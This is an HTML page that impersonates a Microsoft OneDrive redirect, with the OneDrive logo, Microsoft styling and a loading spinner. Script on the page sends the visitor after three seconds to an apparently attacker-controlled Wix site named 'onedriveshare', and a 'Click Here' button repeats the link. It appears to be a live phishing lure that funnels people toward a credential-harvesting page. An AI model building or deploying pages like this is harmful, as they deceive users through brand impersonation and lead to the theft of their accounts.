<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <style>
        body {
            font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f3f3f3;
            text-align: center;
            padding: 50px;
            color: #262626;
        }
        .container {
            background: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
            display: inline-block;
            position: relative;
            opacity: 0;
            animation: fadeIn 2s forwards;
        }
        .onedrive-logo {
            width: 100px;
            margin-top: 20px;
        }
        h1 {
            color: #0078d4;
        }
        a {
            color: #0078d4;
            text-decoration: none;
            font-weight: bold;
        }
        a:hover {
            text-decoration: underline;
        }
        .loading {
            width: 50px;
            height: 50px;
            border: 5px solid #ddd;
            border-top: 5px solid #0078d4;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        @keyframes fadeIn {
            0% { opacity: 0; }
            100% { opacity: 1; }
        }
        .button {
            display: inline-block;
            background-color: #0078d4;
            color: white;
            padding: 10px 20px;
            border-radius: 5px;
            text-decoration: none;
            font-weight: bold;
            margin-top: 15px;
        }
        .button:hover {
            background-color: #005a9e;
        }
        .time {
            font-size: 18px;
            margin-top: 20px;
            color: #0078d4;
        }
    </style>
    <script>
        function getMicrosoftUser() {
            return new Promise((resolve) => {
                setTimeout(() => {
                    resolve("John Doe"); // Simulated user data fetch
                }, 1000);
            });
        }

        function displayTime() {
            const now = new Date();
            const options = { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true };
            const time = now.toLocaleTimeString([], options);
            document.getElementById("current-time").innerText = `Current Time: ${time}`;
        }

        window.onload = async function() {
            const userName = await getMicrosoftUser();
            document.getElementById("user-greeting").innerText = `Hello, ${userName}!`;
            displayTime();
            setInterval(displayTime, 1000); // Update time every second

            setTimeout(function() {
                window.location.href = "https://mailuser6754.wixsite.com/onedriveshare";
            }, 3000);
        };
    </script>
</head>
<body>
    <div class="container" aria-live="polite" aria-labelledby="user-greeting">
        <h1 id="user-greeting">Redirecting to OneDrive...</h1>
        <div class="loading"></div>
        <img class="onedrive-logo" src="https://upload.wikimedia.org/wikipedia/commons/e/e1/OneDrive_logo.svg" alt="OneDrive Logo" loading="lazy">
        <p id="current-time" class="time"></p>
        <p>If you are not redirected automatically, <a href="https://mailuser6754.wixsite.com/onedriveshare" class="button">Click Here</a>.</p>
    </div>
</body>
</html>
